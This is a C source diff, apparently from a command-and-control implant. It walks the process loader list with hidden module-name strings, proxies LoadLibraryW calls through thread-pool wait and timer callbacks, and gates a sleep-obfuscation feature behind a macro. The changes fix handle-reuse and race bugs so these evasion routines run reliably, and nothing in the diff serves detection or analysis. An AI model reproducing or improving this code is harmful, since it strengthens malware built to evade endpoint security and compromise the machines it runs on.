@@ -176,8 +176,8 @@ PVOID LdrModuleSearch(
     Dll[ 2 ] = HideChar( 'L' );
     Dll[ 0 ] = HideChar( '.' );
 
-    Entry      = Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
-    FirstEntry = &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+    Entry      = (PLDR_DATA_TABLE_ENTRY) Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+    FirstEntry = (PLDR_DATA_TABLE_ENTRY) &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
 
     StringCopyW( Name, ModuleName );
 
@@ -194,7 +194,7 @@ PVOID LdrModuleSearch(
             MemZero( Name, sizeof( Name ) );
             return Entry->DllBase;
         }
-        Entry = Entry->InLoadOrderLinks.Flink;
+        Entry = (PLDR_DATA_TABLE_ENTRY) Entry->InLoadOrderLinks.Flink;
     } while ( Entry != FirstEntry );
 
     MemZero( Name, sizeof( Name ) );
@@ -221,7 +221,14 @@ PVOID LdrModuleLoad(
     USHORT         DestSize       = 0;
     HANDLE         Event          = NULL;
     HANDLE         Queue          = NULL;
-    HANDLE         Timer          = NULL;
+    /* Wait is the wait-handle returned by RtlRegisterWait.
+     * TimerHdl is the timer-handle returned by RtlCreateTimer.
+     * They MUST stay separate — passing a timer handle to
+     * RtlDeregisterWaitEx (or vice versa) corrupts the thread pool
+     * because the pool dereferences the wrong TP_* object type.
+     * See BUG-LDR-1 in SleepObf-Analysis.md §8. */
+    HANDLE         Wait           = NULL;
+    HANDLE         TimerHdl       = NULL;
     DWORD          Count          = 5;
     NTSTATUS       NtStatus       = STATUS_SUCCESS;
 
@@ -256,8 +263,18 @@ PVOID LdrModuleLoad(
                 goto DEFAULT;
             }
 
-            /* call LoadLibraryW */
-            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Timer, Event, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
+            /* call LoadLibraryW.
+             *
+             * NOTE: WT_EXECUTEONLYONCE is intentionally NOT set.
+             * WT_EXECUTEONLYONCE tells the pool to auto-deregister the wait
+             * immediately after the callback completes, which races with our
+             * explicit RtlDeregisterWaitEx(Wait, INVALID_HANDLE_VALUE) call
+             * at END: and can dereference a freed TP_WAIT object on some
+             * builds. Without the flag, the wait stays live until the
+             * explicit deregister — which blocks until the callback is fully
+             * done and the wait object is safely reaped.
+             * See BUG-LDR-3 in SleepObf-Analysis.md §8. */
+            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Wait, Event, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, WT_EXECUTEINWAITTHREAD ) ) ) {
                 PRINTF( "RtlRegisterWait: %p\n", NtStatus )
                 goto DEFAULT;
             }
@@ -274,8 +291,12 @@ PVOID LdrModuleLoad(
                 goto DEFAULT;
             }
 
-            /* call LoadLibraryW */
-            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
+            /* call LoadLibraryW.
+             * TimerHdl is owned by Queue — it is reaped automatically by
+             * RtlDeleteTimerQueueEx(Queue, INVALID_HANDLE_VALUE) at END:.
+             * Never call RtlDeregisterWaitEx on it.
+             * See BUG-LDR-1 in SleepObf-Analysis.md §8. */
+            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &TimerHdl, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                 PRINTF( "RtlCreateTimer: %p\n", NtStatus )
                 goto DEFAULT;
             }
@@ -353,16 +374,28 @@ END:
 
     PRINTF( "Module \"%s\": %p\n", ModuleName, Module )
 
+    /* deregister wait handle (blocks until the callback has fully returned,
+     * so the Event handle is safe to close after this).
+     * Only call this on a wait handle — NEVER on a timer handle. */
+    if ( Wait ) {
+        Instance->Win32.RtlDeregisterWaitEx( Wait, INVALID_HANDLE_VALUE );
+        Wait = NULL;
+    }
+
+    /* close queue BEFORE closing Event — RtlDeleteTimerQueueEx blocks until
+     * all timers (including our LoadLibraryW timer) have finished, which
+     * guarantees the callback is done touching the parameters.
+     * Note: TimerHdl is implicitly reaped by queue destruction. */
+    if ( Queue ) {
+        Instance->Win32.RtlDeleteTimerQueueEx( Queue, INVALID_HANDLE_VALUE );
+        Queue = NULL;
+        TimerHdl = NULL;
+    }
+
     /* close event end */
     if ( Event ) {
         SysNtClose( Event );
         Event = NULL;
-    }
-
-    /* close queue */
-    if ( Queue ) {
-        Instance->Win32.RtlDeleteTimerQueue( Queue );
-        Queue = NULL;
     }
 
     return Module;
@@ -1286,6 +1319,7 @@ VOID CfgAddressAdd(
     }
 }
 
+#ifdef SLEEPOBF_USE_TIMER
 /*!
  * Sets an event
  * @param Event
@@ -1295,6 +1329,7 @@ BOOL EventSet(
 ) {
     return NT_SUCCESS( Instance->Win32.NtSetEvent( Event, NULL ) );
 }
+#endif
 
 
 /*!
@@ -1498,7 +1533,7 @@ PROOT_DIR listDir(
     PSUB_DIR         SubDir        = NULL;
     BOOL             IsDir         = FALSE;
     LPWSTR           Path          = NULL;
-    UINT32           PathSize      = NULL;
+    UINT32           PathSize      = 0;
     BOOL             Success       = FALSE;
 
     if ( ( ! StartPath ) || ( FilesOnly && DirsOnly ) ) {
